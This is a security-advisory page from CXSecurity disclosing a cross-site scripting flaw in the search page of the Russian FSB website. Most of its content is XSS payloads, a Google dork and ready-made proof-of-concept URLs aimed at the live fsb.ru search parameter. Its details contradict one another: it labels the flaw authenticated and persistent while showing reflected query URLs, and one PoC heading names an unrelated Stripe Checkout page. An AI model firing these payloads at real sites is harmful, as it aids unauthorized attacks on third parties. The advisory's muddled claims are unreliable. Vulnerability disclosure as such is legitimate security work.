---
title: Russian FSB Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2024120005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-12-04
fetch_date: 2025-10-06T19:36:52.543107
---

# Russian FSB Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Russian FSB Cross Site Scripting** **2024.12.03**  Credit:  **[E1.Coders](https://cxsecurity.com/author/E1.Coders/1/)**  Risk: **Low**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

/\*!
- # VULNERABILITY: Cross Site Scripting Federal Security Service of the Russian Federation
- # Authenticated Persistent XSS
- # GOOGLE DORK: inurl:fsb.ru/fsb/sh.htm?query=
- # DATE: 2024-11-29
- # SECURITY RESEARCHER:  E1.Coders
- # VENDOR: FSB [ http://www.fsb.ru/ ]
- # SOFTWARE LINK: http://www.fsb.ru/
- # CVSS: AV:N/AC:L/PR:H/UI:N/S:C
- # CWE: CWE-79
\*/

### -- [ Info: ]

[i] A valid persistent XSS vulnerability was discovered in the search section of the Federal Security Service of the Russian Federation website.

[i] Vulnerable parameter(s): sh.htm?query=  < AND >  /fsb/sh.htm?query=

### -- [ Impact: ]

[~] Malicious JavaScript code injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.

### -- [ Payloads: ]

`"'><img src=xxx:x \x22onerror=javascript:alert(1)>

"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />

`"'><img src=xxx:x onerror\x09=javascript:alert(1)>

### -- [ PoC #1 | Authenticated Persistent XSS | Background Image (Stripe Checkout): ]

http://www.fsb.ru/fsb/sh.htm?query=`%22%27%3E%3Cimg%20src=xxx:x%20onerror\x09=javascript:alert(1)%3E

http://www.fsb.ru/fsb/sh.htm?query=%22/%3E%3Cimg/onerror=\x20javascript:alert(1)\x20src=xxx:x%20/%3E

http://www.fsb.ru/fsb/sh.htm?query=`%22%27%3E%3Cimg%20src=xxx:x%20\x22onerror=javascript:alert(1)%3E

### -- [ Contacts: ]

[+] E-Mail: E1.Coders@Mail.Ru

[+] GitHub: @e1coders

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024120005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top